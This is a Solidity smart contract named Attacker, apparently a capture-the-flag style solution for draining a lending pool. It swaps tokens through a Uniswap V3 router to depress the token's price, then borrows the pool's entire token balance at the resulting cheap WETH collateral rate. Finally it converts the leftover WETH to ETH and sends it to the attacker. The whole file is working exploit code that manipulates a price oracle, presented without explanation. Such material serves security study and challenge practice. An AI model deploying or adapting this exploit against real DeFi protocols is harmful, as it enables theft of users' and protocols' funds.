// SPDX-License-Identifier: MIT

pragma solidity 0.8.17;

import {IERC20} from "openzeppelin-contracts/token/ERC20/IERC20.sol";
import {IUniswapV3Pool, ISwapRouter} from "./interfaces.sol";

interface IWETH {
    function approve(address, uint256) external returns (bool);

    function withdraw(uint256) external;

    function balanceOf(address) external view returns (uint256);
}

interface ILendingPool {
    function borrow(uint256 borrowAmount) external;

    function calculateDepositOfWETHRequired(uint256 amount) external view returns (uint256);
}

contract Attacker {
    ISwapRouter immutable router;
    ILendingPool immutable pool;
    IERC20 immutable token;
    IWETH immutable weth;

    address payable immutable attacker;

    constructor(address _router, address _pool, address _token, address _weth) {
        router = ISwapRouter(_router);
        pool = ILendingPool(_pool);
        token = IERC20(_token);
        weth = IWETH(_weth);

        attacker = payable(msg.sender);
    }

    function movePrice() external {
        require(msg.sender == attacker, "Access_Denied");
        uint256 amount = token.balanceOf(attacker);

        token.transferFrom(attacker, address(this), amount);

        token.approve(address(router), amount);

        ISwapRouter.ExactInputSingleParams memory params = ISwapRouter.ExactInputSingleParams(
            address(token), address(weth), 3000, address(this), block.timestamp + 3, amount, 0, 0
        );

        router.exactInputSingle(params);
    }

    function borrowFromPoolAtCheap() external {
        require(msg.sender == attacker, "Access_Denied");

        uint256 poolBalance = token.balanceOf(address(pool));

        uint256 wethAmount = pool.calculateDepositOfWETHRequired(poolBalance);
        weth.approve(address(pool), wethAmount);

        pool.borrow(poolBalance);

        uint256 tokenAmount = token.balanceOf(address(this));
        token.transfer(attacker, tokenAmount);
    }

    function sweepExtraWeth() external {
        require(msg.sender == attacker, "Access_Denied");

        uint256 wethAmount = weth.balanceOf(address(this));
        weth.withdraw(wethAmount);

        attacker.transfer(address(this).balance);
    }
}
